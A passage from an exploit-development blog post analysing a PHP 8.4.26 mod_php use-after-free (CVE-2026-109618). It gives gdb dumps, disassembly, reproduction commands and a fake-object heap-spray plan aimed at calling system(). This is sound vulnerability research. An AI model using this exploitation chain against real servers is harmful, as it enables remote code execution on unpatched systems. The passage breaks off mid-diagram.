---
title: "From crash to shell: developing CVE-2026-109618 into code execution"
tags:
  - security
  - php
  - cve-2026-109618
  - cve-2026-109619
  - memory-corruption
  - rce
  - lfi
  - exploit-development
  - mod-php
  - session-poisoning
  - vulnerability-research
---

The [earlier post](https://hackgptdeveloper.github.io/2026/10/28/php2shell-cve-2026-109618-crash-poc.html) ended with a working segfault: a crafted multipart request crashes a PHP 8.4.26 `mod_php` worker, and the same request against 8.4.27 returns a clean OOM error. That is a crash PoC, not code execution. This post records the next step: taking that crash and turning it into a shell.

There are two routes.

1. **The memory-corruption route.** Characterize the corruption primitive, then build the standard exploitation chain from it (ASLR, heap grooming, a fake object, a controlled call). This route is characterized end to end but not finished: it still needs a heap-address leak.
2. **The LFI route.** Use the confirmed session-poisoning behavior (the default-on `session.upload_progress` handler writes an attacker-controlled key verbatim into the session file, and an OOM skips the cleanup so it persists) plus an `include($_GET['page'])` endpoint. This route is a working callback shell, run in Docker.

Throughout, steps that were measured and reproduced are marked **[confirmed]**; steps that are the established technique but were not carried out here are marked **[technique]**.

---

## 1. The primitive

The crash is characterized by instrumenting the vulnerable PHP 8.4.26 runtime. The question was: what exactly is dangling or overwritten, and what can an attacker control?

### 1.1 Result in one table

| | |
|---|---|
| Crash site | `zend_array_destroy()` → `subl $0x1,(%rdi)` |
| Caller chain | `php_handler` (mod_php) → `php_request_shutdown` → `zend_array_destroy` |
| Corrupted object | the `arData` (bucket array) of the `$_FILES` `zend_array` |
| Corrupted field | `bucket->val.value` — the `zval`'s 8-byte value union |
| Corrupting data | the multipart **field name** (attacker-controlled bytes) |
| Primitive 1 | dereference an attacker-controlled pointer `P` and do `*(uint32_t*)P -= 1` |
| Primitive 2 | `efree(arData - nTableMask*4)` at the end of `zend_array_destroy` |

This was proven empirically. With `name="AAAA…[k]"` the faulting pointer is `0x4141414141414141`; with `name="NNNN…[k]"` it is `0x4e4e4e4e4e4e4e4e`; with `pad='P'` and `name='N'` it is still `0x4e4e…`. The field name, not the pad value, is the byte source. The attacker controls the exact 8 bytes the runtime treats as a `zend_refcounted*`.

### 1.2 Why ASan alone could not see it

The first move was an AddressSanitizer build: PHP 8.4.26 with `-fsanitize=address -O1 -g`, `--disable-all --enable-cli --enable-cgi --enable-session --enable-debug`, driven by `php-cgi` with a multipart body on stdin. Three findings came out of that.

**`USE_ZEND_ALLOC=0` alone disables `memory_limit`.** PHP's allocator selection in `Zend/zend_alloc.c::alloc_globals_ctor`:

```c
tmp = getenv("USE_ZEND_ALLOC");
if (tmp && !ZEND_ATOL(tmp)) {
    bool tracked = (tmp = getenv("USE_TRACKED_ALLOC")) && ZEND_ATOL(tmp);
    ...
    if (!tracked) {
        /* Use system allocator. */               /* plain malloc: NO limit */
        mm_heap->custom_heap._malloc = __zend_malloc;
        ...
    } else {
        /* Use system allocator and track allocations for auto-free. */
        mm_heap->custom_heap._malloc = tracked_malloc;   /* tracks + enforces limit */
        ...
    }
    return;
}
```

`USE_ZEND_ALLOC=0` switches to the system allocator, but only `USE_TRACKED_ALLOC=1` selects the tracked system allocator that still enforces `memory_limit`. Without the latter, a 9 MB allocation against an 8 MB limit succeeds silently, so an ASan run never triggers the OOM. Both env vars are required:

```
USE_ZEND_ALLOC=0 USE_TRACKED_ALLOC=1
```

**`php-cgi` does not reproduce the corruption — mod_php does.** `php-cgi`'s startup-failure path (`sapi/cgi/cgi_main.c`):

```c
if (php_request_startup() == FAILURE) {
    if (fastcgi) { fcgi_finish_request(request, 1); }
    SG(server_context) = NULL;
    php_module_shutdown();
    return FAILURE;          /* <-- no php_request_shutdown() */
}
```

Apache mod_php (`sapi/apache2handler/sapi_apache2.c::php_handler`) runs `php_request_shutdown()` even when `php_request_startup()` failed (via `php_apache_request_dtor`). That unconditional shutdown walks the half-built state and corrupts. I patched `cgi_main.c` to mimic it:

```c
if (php_request_startup() == FAILURE) {
    ...
    php_request_shutdown((void *) 0);   /* added: mimic mod_php */
    SG(server_context) = NULL;
    php_module_shutdown();
    return FAILURE;
}
```

**The corruption is Zend-MM-specific.** Even with the cgi patch and the tracked allocator, shutdown ran cleanly with no ASan report. The corruption lives inside the Zend MM allocator (its 2 MB chunk arena and OOM realloc path), which ASan cannot instrument. So the right instrument is gdb against the real mod_php build (Zend MM). The `php:8.4.26-apache-bookworm` image ships `libphp.so` not stripped, so symbols resolve.

The takeaway: ASan only sees PHP bugs that reproduce under `USE_ZEND_ALLOC=0 USE_TRACKED_ALLOC=1`. Zend-MM-internal corruption needs gdb and the real build.

### 1.3 The backtrace

Running `apache2 -X` under gdb:

```
Program received signal SIGSEGV, Segmentation fault.
0x00007f8a4002d14e in zend_array_destroy () from /usr/lib/apache2/modules/libphp.so
#1  php_request_shutdown () from libphp.so
#2  php_handler () from libphp.so
#3  ap_run_handler → ap_invoke_handler → ap_process_async_request → ap_process_request
```

`php_handler` (mod_php) → `php_request_shutdown` → `zend_array_destroy` → crash. This is the pre-RINIT path: the multipart parser OOM'd during request startup, `php_request_startup` returned FAILURE, mod_php ran shutdown anyway, and shutdown destroyed the half-built `$_FILES` array.

### 1.4 Structure layouts (offsets matter for the write primitive)

All from PHP 8.4.26 `Zend/zend_types.h`, x86-64, non-ZTS.

`zend_refcounted_h` (8 bytes) — the GC header every heap object starts with:

```c
typedef struct _zend_refcounted_h {
    uint32_t         refcount;      /* offset 0 */
    union {
        uint32_t type_info;         /* offset 4: type + flags */
    } u;
} zend_refcounted_h;
```

`zval` (16 bytes):

```c
struct _zval_struct {
    zend_value value;               /* offset 0: 8-byte union (lval/dval/str/arr/obj/res/ref/ptr) */
    union {
        uint32_t type_info;
        struct {
            uint8_t  type;          /* offset 8 */
            uint8_t  type_flags;    /* offset 9 */
            uint16_t extra;         /* offset 10 */
        } v;
    } u1;
    union {
        uint32_t next;              /* offset 12: hash collision chain / cache_slot / ... */
        ...
    } u2;
};
```

`Bucket` (32 bytes):

```c
typedef struct _Bucket {
    zval              val;          /* offset 0  (16 bytes) */
    zend_ulong        h;            /* offset 16 (hash or numeric index) */
    zend_string      *key;          /* offset 24 (string key, NULL for numeric) */
} Bucket;
```

`zend_array` / `HashTable` (56 bytes) — what `$_FILES` is:

```c
struct _zend_array {
    zend_refcounted_h gc;                       /* offset 0  (refcount@0, type_info@4) */
    union { struct { uint8_t flags; ... } v; uint32_t flags; } u;  /* offset 8  */
    uint32_t          nTableMask;               /* offset 12 (negative; hash area size) */
    union { uint32_t *arHash; Bucket *arData; zval *arPacked; };   /* offset 16 */
    uint32_t          nNumUsed;                 /* offset 24 */
    uint32_t          nNumOfElements;           /* offset 28 */
    uint32_t          nTableSize;               /* offset 32 */
    uint32_t          nInternalPointer;         /* offset 36 */
    zend_long         nNextFreeElement;         /* offset 40 */
    dtor_func_t       pDestructor;              /* offset 48 */
};
```

`HT_GET_DATA_ADDR(ht)` is the allocation base (`arData + nTableMask`, where `nTableMask` is negative); `ht->arData` is the bucket start inside that allocation.

### 1.5 The faulting instruction and the two primitives

Annotated disassembly of `zend_array_destroy` (the hot path):

```asm
zend_array_destroy:
  mov  %rdi,%rbp                      ; rbp = ht
  cmpl $0x3ff,0x4(%rdi)               ; if type_info > 0x3ff → slow path (cached/immutable)
  mov  0x18(%rbp),%eax                ; eax = ht->nNumUsed
  movl $0x11,0x4(%rbp)                ; ht->type_info = 0x11  ("being destroyed" marker)
  test %eax,%eax                      ; if nNumUsed == 0 → skip to efree
  mov  0xc31e43(%rip),%rcx            ; load default pDestructor
  cmp  %rcx,0x30(%rbp)                ; compare ht->pDestructor (offset 0x30=48)
  jne  6051c0                         ; custom destructor → slow path
  mov  0x8(%rbp),%edx                 ; ht->u.flags
  mov  0x10(%rbp),%rbx                ; rbx = ht->arData
  mov  %eax,%r12d                     ; r12 = nNumUsed
  test $0x4,%dl                       ; HT_FLAG_PACKED?
  ...                                 ; compute end = arData + nNumUsed*stride

  ; -- bucket iteration loop --
605011: cmpb $0x0,0x9(%rbx)           ; bucket occupied?
605017: mov  (%rbx),%rdi              ; rdi = bucket->val.value   (offset 0)
60501a: subl $0x1,(%rdi)              ; *(uint32_t*)rdi -= 1       <-- the write primitive
60501d: jne  604fe8                   ; refcount != 0 → next bucket
60501f: call rc_dtor_func             ; refcount hit 0 → destroy the object

  ; -- after the loop --
605030: mov  0xc(%rbp),%eax           ; ht->nTableMask
605033: mov  0x10(%rbp),%rdi          ; ht->arData
605037: neg  %eax ; shl $0x2,%rax     ; nTableMask*4
60503d: sub  %rax,%rdi                ; rdi = arData - nTableMask*4  (allocation base)
605040: call _efree                   ; efree(arData - nTableMask*4)
```

The crash is the `subl $0x1,(%rdi)` at `+446` (`60514e` in the non-packed variant, same instruction). Two primitives are visible:

1. **`*(uint32_t*)P -= 1`** where `P = bucket->val.value` (attacker bytes). If the decremented refcount reaches 0, `rc_dtor_func(P)` runs.
2. **`efree(arData - nTableMask*4)`** — an arbitrary-ish free reachable if the loop survives.

### 1.6 Proof of full control of `P`

Three gdb runs, three field-name payloads:

| field name | `rdi` at fault | meaning |
|---|---|---|
| `AAAA…[k]` | `0x4141414141414141` | 'A' = 0x41 |
| `NNNN…[k]` | `0x4e4e4e4e4e4e4e4e` | 'N' = 0x4e |
| `pad='P'`, `name='N'` | `0x4e4e4e4e4e4e4e4e` | field name, not pad, is the source |

`rbp` (=`ht`) and `rbx` (=`arData`) are valid heap pointers in every run; only `rdi` is corrupted. The attacker controls the exact 8 bytes of `bucket->val.value`.

### 1.7 The mechanism: use-after-free of `arData`

A gdb memory dump at the crash (`x/12gx $rbp` for `ht`, `x/96gx $rbx` for `arData`):

```
ht header (rbp = 0x7f8a3f8570a8), intact:
  0x0000001100000000   gc.refcount=0, type_info=0x11 (the "destroying" marker set by zend_array_destroy)
  0xfffffff000000010   u.flags=0x10, nTableMask=0xfffffff0 (-16)
  0x00007f8a3f950400   arData → 0x7f8a3f950400   <-- STALE
  0x0000000100000001   nNumUsed=1, nNumOfElements=1
  0x0000000000000008   nTableSize=8, nInternalPointer=0
  0x8000000000000000   nNextFreeElement
  0x00007f8a40076b60   pDestructor (valid function pointer)

arData (rbx = 0x7f8a3f950400), the freed-and-reused block:
  0x4e4e4e4e4e4e4e4e 0x4e4e4e4e4e4e4e4e   ('N' bytes, hundreds of them)
  0x4e4e4e4e4e4e4e4e 0x4e4e4e4e4e4e4e4e
  ... (mostly 0x4e4e…)
  0xb50b316e9bd98065                    (a surviving hash value)
  0x00007f8a3f950640                    (a pointer, past the 8-bucket array)
```

The `ht` header is intact and its `arData` field points at `0x7f8a3f950400`. That `arData` region is now filled with the attacker's field-name bytes ('N'): it has been freed and its storage reused by a field-name buffer. `nNumUsed=1`, so `zend_array_destroy` iterates the stale bucket array and reads `bucket[0].val.value = 0x4e4e…` as a `zend_refcounted*`.

<div markdown="0" class="diagram" style="margin:1.5em 0;">
<svg viewBox="0 0 940 560" width="100%" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Use-after-free of the arData bucket array">
  <defs>
    <marker id="arrA" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#c0392b"/>
    </marker>
    <marker id="arrGray" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#666"/>
    </marker>
  </defs>

  <!-- header box -->
  <rect x="24" y="60" width="280" height="408" rx="8" fill="#eef3fb" stroke="#4a7fb5" stroke-width="1.5"/>
  <text x="164" y="84" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-weight="bold" font-size="15" fill="#1a3a5c">zend_array (HashTable)</text>
  <text x="164" y="102" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#33475f">the $_FILES array — header intact</text>
  <text x="40" y="132" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x00  gc.refcount = 0</text>
  <text x="40" y="166" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x04  gc.type_info = 0x11</text>
  <text x="40" y="200" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x08  flags</text>
  <text x="40" y="234" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x0c  nTableMask = -16</text>
  <text x="40" y="268" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#b02a2a" font-weight="bold">+0x10  arData ─────────▶</text>
  <text x="40" y="302" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x18  nNumUsed = 1</text>
  <text x="40" y="336" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x1c  nNumOfElements = 1</text>
  <text x="40" y="370" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x20  nTableSize = 8</text>
  <text x="40" y="404" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x30  pDestructor (valid)</text>
  <text x="40" y="438" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12" fill="#556">everything in this box is intact</text>

  <!-- stale pointer arrow -->
  <path d="M304 264 C 380 264 380 150 470 150" fill="none" stroke="#c0392b" stroke-width="2" stroke-dasharray="6 4" marker-end="url(#arrA)"/>
  <text x="392" y="118" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#c0392b" font-weight="bold">ht-&gt;arData (stale)</text>

  <!-- freed block -->
  <rect x="480" y="60" width="360" height="330" rx="8" fill="#fdecec" stroke="#c0392b" stroke-width="1.5"/>
  <text x="660" y="84" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-weight="bold" font-size="15" fill="#8a1f1f">freed arData block</text>
  <text x="660" y="102" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#8a1f1f">320 B / 8 buckets — reused by the ~700 KB field-name buffer</text>

  <rect x="496" y="112" width="328" height="28" fill="#f6c6c6" stroke="#c0392b" stroke-width="1"/>
  <text x="504" y="131" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#8a1f1f" font-weight="bold">bucket[0].val.value = 0x4e4e4e4e4e4e4e4e</text>
  <text x="504" y="170" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#4a2b2b">bucket[0].val.type  = 0x4e4e (junk)</text>
  <text x="504" y="204" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#4a2b2b">bucket[0].h        = 0x4e4e… (junk)</text>
  <text x="504" y="238" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#4a2b2b">bucket[0].key      = 0x4e4e… (junk)</text>
  <text x="504" y="272" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#4a2b2b">bucket[1..7]       = 0x4e4e… × 7</text>
  <text x="504" y="306" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#4a2b2b">… hundreds of 'N' bytes …</text>
  <text x="504" y="340" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#4a2b2b">(plus a surviving hash, a stale ptr)</text>
  <text x="504" y="374" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12" fill="#8a1f1f">all 8 bytes of val.value are attacker bytes</text>

  <!-- primitive callout -->
  <rect x="24" y="492" width="816" height="56" rx="6" fill="#fff7e6" stroke="#c8a24b" stroke-width="1.5"/>
  <text x="40" y="515" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#5c4a1f">mov (%rbx),%rdi  →  rdi = bucket[0].val.value = P   then   subl $0x1,(%rdi)  →  *(uint32_t*)P -= 1</text>
  <text x="40" y="536" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#5c4a1f">P = 0x4e4e4e4e4e4e4e4e (unmapped) → SIGSEGV;  and  efree(arData - nTableMask*4) is reachable if the loop survives</text>
</svg>
<p class="diagram-caption" style="text-align:center;font-size:.85em;color:#6a737d;margin:.25em 0 1.5em;">Use-after-free: the <code>$_FILES</code> header still points at a bucket array whose storage has been recycled for the attacker's field-name bytes.</p>
</div>

**Confirmed vs. inferred.** It is confirmed that `ht->arData` references storage filled with attacker field-name bytes (the dump above). The precise allocation ordering — which of the several field-name copies (`param`, `abuf`, `lbuf`, the `zend_string` key, the header `smart_str`) reuses which freed block, at which `zend_bailout` point — is the one remaining unpinned detail; pinning it needs a hardware watchpoint on `arData`.

Two further confirmations:

- `pDestructor` resolves to `zval_ptr_dtor` (`info symbol` in gdb): the array being destroyed is an ordinary PHP array (a superglobal), not a special-cased structure. Its buckets are destroyed value-by-value through `zval_ptr_dtor`, which is exactly the `*(uint32_t*)P -= 1` / `rc_dtor_func(P)` path the primitive abuses.
- A wide dump (`x/1024gx $rbx`) shows `arData` sits inside a large field-name buffer. The `'N'` region spans far more than the 8-bucket array, and adjacent freed 320-byte blocks (spaced `0x140`) still contain surviving valid buckets — e.g. `val.value = 0x00007f3366e01000` — mixed with `'N'` overwrites. The heap around the crash is a mixture of stale pointers and attacker bytes.

### 1.8 Partial overwrite is blocked (empirically)

The obvious ASLR bypass — clobber only the low bytes of `bucket->val.value` so the high bytes of a real pointer survive — is not reachable for this bug.

- The field name must be ~700 KB: it is the "weight" that pushes the request over `memory_limit` at the `$_FILES` registration step. A short field name does not OOM there, and a larger pad cannot compensate — the pad itself OOMs first. (A sweep of field names of 4/16/64/256/700 bytes against pads 4000–8000 KB produced zero crashes except in the 700 KB case, and only at pad 640–1280 KB.)
- A ~700 KB field-name buffer is a large allocation, and it fully overwrites the small (320-byte) `arData` block — all 8 bytes of `bucket->val.value` become attacker bytes, so no pointer high-bytes survive.

Consequence: turning the primitive into RCE hinges on an ASLR info leak (Section 3, Step 1b), not on a partial overwrite.

### 1.9 The vulnerable allocator code

The old OOM handler (deleted by the fix, commit `01a40e89fb`):

```c
static ZEND_COLD ZEND_NORETURN void zend_mm_safe_error(zend_mm_heap *heap,
    const char *format, size_t limit,
#if ZEND_DEBUG
    const char *filename, uint32_t lineno,
#endif
    size_t size)
{
    heap->overflow = 1;
    zend_try {
        zend_error_noreturn(E_ERROR, format, limit, ..., size);
    } zend_catch {
    } zend_end_try();
    heap->overflow = 0;
    zend_bailout();    /* longjmp() out of the allocator, mid-operation */
    exit(1);
}
```

`zend_bailout()` is `setjmp`/`longjmp`: it abandons the current C call stack without running destructors or finishing whatever the caller of `emalloc` was building. When the caller was half-way through a `zend_hash_update`/resize or a field-name allocation, the `longjmp` skips the assignment that would have kept the data structures consistent.

The old realloc grow/truncation path (`zend_mm_realloc_heap`) also lacked NULL checks:

```c
/* small extension / truncation */
ret = zend_mm_alloc_small(heap, ZEND_MM_SMALL_SIZE_TO_BIN(size) ...); /* may return NULL on re-entrant OOM */
copy_size = use_copy_size ? MIN(old_size, copy_size) : old_size;
memcpy(ret, ptr, copy_size);        /* if ret == NULL, memcpy(NULL, ...) */
zend_mm_free_small(heap, ptr, old_bin_num);
```

The fix (`zend_mm_check_limit`, `ZEND_HAS_OOM()`, fallible `femalloc`/`ferealloc` returning NULL, a delayed-OOM state machine, and a hard `_exit(137)` limit) replaces this "longjmp out of the allocator" behavior with "defer the error to a safe point and let callers unwind cleanly".

The vulnerable resize/realloc path in `Zend/zend_hash.c::zend_hash_do_resize` (8.4.26, before the fix):

```c
void *new_data, *old_data = HT_GET_DATA_ADDR(ht);
uint32_t nSize = ht->nTableSize + ht->nTableSize;
Bucket *old_buckets = ht->arData;

new_data = pemalloc(HT_SIZE_EX(nSize, HT_SIZE_TO_MASK(nSize)), ...); /* OOM bailout can fire here */
ht->nTableSize = nSize;
ht->nTableMask = HT_SIZE_TO_MASK(ht->nTableSize);
HT_SET_DATA_ADDR(ht, new_data);        /* ht->arData = new_data */
memcpy(ht->arData, old_buckets, sizeof(Bucket) * ht->nNumUsed);
pefree(old_data, ...);                 /* old bucket storage freed */
zend_hash_rehash(ht);
```

An OOM turns into `zend_bailout()` inside this sequence (and inside the field-name allocations that follow), so the parser exits with the array in a half-updated state. The freed bucket storage is then handed back out for one of the ~700 KB field-name copies, and mod_php's shutdown walks it as if it were still valid buckets.

### 1.10 Reproducing this analysis

```bash
# 1. Build vulnerable PHP (cgi) with ASan — see /home/ubuntu/php-src-asan/build.sh
#    CFLAGS="-O1 -g -fsanitize=address -fno-omit-frame-pointer"
#    LDFLAGS="-fsanitize=address"
#    ./configure --disable-all --enable-cli --enable-cgi --enable-session --enable-debug

# 2. Reproduce under ASan (needs BOTH env vars):
#    USE_ZEND_ALLOC=0 USE_TRACKED_ALLOC=1 \
#      sapi/cgi/php-cgi -C -n -d memory_limit=8M ... < body
#    (with cgi_main.c patched to call php_request_shutdown() on startup failure)

# 3. Reproduce under gdb against real mod_php (Zend MM):
docker run -d --name dbg -p 18090:80 php2shell:vuln sleep infinity
docker exec dbg apt-get install -y gdb
docker cp gdb.cmd dbg:/tmp/gdb.cmd     # gdb.cmd in this repo
docker exec -d dbg bash -c 'source /etc/apache2/envvars; mkdir -p /run/apache2 /var/lock/apache2; gdb -batch -x /tmp/gdb.cmd --args /usr/sbin/apache2 -X > /tmp/gdb.out 2>&1'
# send the files_registration payload (pad + name="<700KB>[k]"), then:
docker exec dbg cat /tmp/gdb.out
```

The trigger payload is `files_registration` from `poc/exploit.py` (pad field + a ~700 KB field name, `memory_limit=8M`, parser limits raised).

---

## 2. From primitive to shell

The primitive is, precisely:

```
P = attacker-controlled 8 bytes
*(uint32_t*)P -= 1            # a 4-byte decrement at an address we choose
if (that value became 0)
    rc_dtor_func(P)           # a call with P as argument
```

Two things stand between this and a shell:

1. `P` must be a mapped, writable address. Right now it is raw bytes like `0x4e4e4e4e4e4e4e4e`, which is unmapped, so the first dereference crashes.
2. `rc_dtor_func(P)` must be steered to run our command, not just destroy some object.

### 2.1 The four concepts

**Heap and stack.** The stack holds local variables and grows/shrinks with function calls. The heap is the large region where programs request variable-sized chunks of memory at runtime (`malloc`). All of PHP's objects — strings, arrays, objects — live on the heap. The corruption here lives on the heap: a freed chunk of heap memory is still referenced, and attacker data has been written into it.

**ASLR (Address Space Layout Randomization).** Every time the process starts, the heap, libraries, and stack are loaded at random base addresses. A pointer's actual value (e.g. `0x7f8a3f950400`) is different each run, so we cannot hard-code an address into the field name.

**Function pointers and handler tables.** Instead of calling a function directly, C programs often call through a pointer stored inside a struct — a "virtual method" or "handler". PHP's `zend_object` does exactly this:

```c
struct _zend_object {
    zend_refcounted_h          gc;         /* offset 0  (refcount@0, type_info@4) */
    uint32_t                   handle;     /* offset 8  */
    uint32_t                   extra_flags;/* offset 12 */
    zend_class_entry          *ce;         /* offset 16 */
    const zend_object_handlers *handlers;  /* offset 24 */
    HashTable                 *properties; /* offset 32 */
    zval                       properties_table[1];
};
```

`handlers` points to a table of function pointers. Two of them matter for object destruction:

```c
typedef void (*zend_object_free_obj_t)(zend_object *object);  /* "free this object" */
typedef void (*zend_object_dtor_obj_t)(zend_object *object);  /* "run __destruct" */

struct _zend_object_handlers {
    ...
    zend_object_free_obj_t free_obj;   /* required */
    zend_object_dtor_obj_t dtor_obj;   /* required */
    ...
};
```

If we control `obj->handlers`, we control which function pointer gets called.

**Reference counting.** Every heap object starts with `zend_refcounted_h` (refcount at offset 0, type_info at offset 4). When a reference is dropped, PHP decrements `refcount`; when it reaches 0, the object is destroyed by looking at `type_info` and dispatching to the right destructor. Values of interest: `IS_STRING = 6`, `IS_ARRAY = 7`, `IS_OBJECT = 8`.

The primitive maps directly onto this: the `subl $0x1,(%rdi)` is PHP decrementing a refcount, and `rc_dtor_func(P)` is "the refcount hit zero, so destroy `P` according to its `type_info`".

### 2.2 Step 1 — make `P` valid (the ASLR problem)  **[technique]**

`P = 0x4e4e4e4e4e4e4e4e` is unmapped. We need `P` to point at memory we control. Three standard routes:

**1a. Partial overwrite — ruled out for this bug.** If only the low bytes of an existing pointer are clobbered, the high bytes survive and `P` lands in the same heap region as the original object. This requires the field-name buffer to be short enough to leave the bucket's high bytes intact — but a short field name cannot trigger the corruption at all (Section 1.8).

**1b. Info leak.** Read one heap address out of the process (the sibling CVE-2026-109619 advertises memory disclosure), then put that address literally into the field name. One leaked address plus full control of `P` is nearly done. This is Section 4.

**1c. Brute force / low entropy.** If a pointer is partially randomized (only a few bits change), guess it. Not viable here — the heap is fully randomized (`arData` moved across 3 observed runs).

### 2.3 Step 2 — heap grooming: place a fake object at `P`  **[technique]**

Heap grooming (a.k.a. heap feng shui) means making repeated, precisely-sized allocations so that a known heap location contains known bytes we chose. Spray many copies of a fake object so that wherever `P` points in the sprayed region, it lands on our fake object.

A fake object for this primitive, using the offsets from Section 2.1:

```
offset 0x00  refcount   = 1            ← so *(uint32_t*)P -= 1  →  0  →  rc_dtor_func runs
offset 0x04  type_info  = 8            ← IS_OBJECT → object destructor path
offset 0x08  handle     = (anything)
offset 0x0c  extra_flags= 0
offset 0x10  ce         = (a valid-ish pointer, can be fake)
offset 0x18  handlers   = <address of a fake handlers table>   ← the important one
```

Then `rc_dtor_func(P)` sees `IS_OBJECT`, treats `P` as `zend_object*`, reads `obj->handlers` (at `P+0x18`), and calls `obj->handlers->free_obj(obj)`.

The fake handlers table is a second sprayed buffer whose `free_obj` slot holds whatever function address we want to call, and whose argument is `obj = P`.

<div markdown="0" class="diagram" style="margin:1.5em 0;">
<svg viewBox="0 0 940 520" width="100%" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Fake object and fake handlers table">
  <defs>
    <marker id="arrB" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#1f6f43"/>
    </marker>
    <marker id="arrB2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#666"/>
    </marker>
  </defs>

  <!-- P -->
  <rect x="300" y="24" width="260" height="44" rx="6" fill="#fff7e6" stroke="#c8a24b" stroke-width="1.5"/>
  <text x="430" y="51" text-anchor="middle" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#5c4a1f">P = attacker-controlled 8 bytes</text>
  <path d="M390 68 L 200 136" fill="none" stroke="#666" stroke-width="2" marker-end="url(#arrB2)"/>

  <!-- fake object -->
  <rect x="60" y="140" width="300" height="300" rx="8" fill="#e9f6ee" stroke="#1f6f43" stroke-width="1.5"/>
  <text x="210" y="164" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-weight="bold" font-size="15" fill="#14532d">fake zend_object (sprayed)</text>
  <rect x="76" y="176" width="268" height="26" fill="#c8e6d2" stroke="#1f6f43" stroke-width="1"/>
  <text x="84" y="194" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#14532d" font-weight="bold">+0x00  refcount = 1  (decrement → 0)</text>
  <text x="84" y="236" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x04  type_info = 8 (IS_OBJECT)</text>
  <text x="84" y="270" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x08  handle (anything)</text>
  <text x="84" y="304" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x0c  extra_flags = 0</text>
  <text x="84" y="338" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">+0x10  ce (fake)</text>
  <text x="84" y="372" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#1f6f43" font-weight="bold">+0x18  handlers ─────────▶</text>

  <!-- fake handlers table -->
  <rect x="500" y="140" width="360" height="220" rx="8" fill="#eef3fb" stroke="#4a7fb5" stroke-width="1.5"/>
  <text x="680" y="164" text-anchor="middle" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-weight="bold" font-size="15" fill="#1a3a5c">fake zend_object_handlers</text>
  <text x="516" y="200" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">offset +0x00  get_properties = …</text>
  <text x="516" y="234" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">…</text>
  <rect x="516" y="246" width="328" height="26" fill="#d5e3f4" stroke="#4a7fb5" stroke-width="1"/>
  <text x="524" y="264" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#1a3a5c" font-weight="bold">free_obj = system() / gadget</text>
  <text x="516" y="300" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">dtor_obj = …</text>
  <text x="516" y="334" font-family="ui-monospace,Menlo,Consolas,monospace" font-size="13" fill="#22303e">…</text>

  <path d="M360 368 C 430 368 430 260 500 262" fill="none" stroke="#1f6f43" stroke-width="2" marker-end="url(#arrB)"/>
  <text x="406" y="300" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12" fill="#1f6f43" font-weight="bold">obj-&gt;handlers</text>

  <!-- flow -->
  <g font-family="ui-monospace,Menlo,Consolas,monospace" font-size="12" fill="#22303e">
    <rect x="20" y="470" width="168" height="40" rx="6" fill="#f0f0f0" stroke="#999" stroke-width="1"/>
    <text x="104" y="495" text-anchor="middle">subl: *(u32*)P -= 1</text>
    <rect x="204" y="470" width="150" height="40" rx="6" fill="#f0f0f0" stroke="#999" stroke-width="1"/>
    <text x="279" y="495" text-anchor="middle">refcount 1 → 0</text>
    <rect x="370" y="470" width="150" height="40" rx="6" fill="#f0f0f0" stroke="#999" stroke-width="1"/>
    <text x="445" y="495" text-anchor="middle">rc_dtor_func(P)</text>
    <rect x="536" y="470" width="170" height="40" rx="6" fill="#f0f0f0" stroke="#999" stroke-width="1"/>
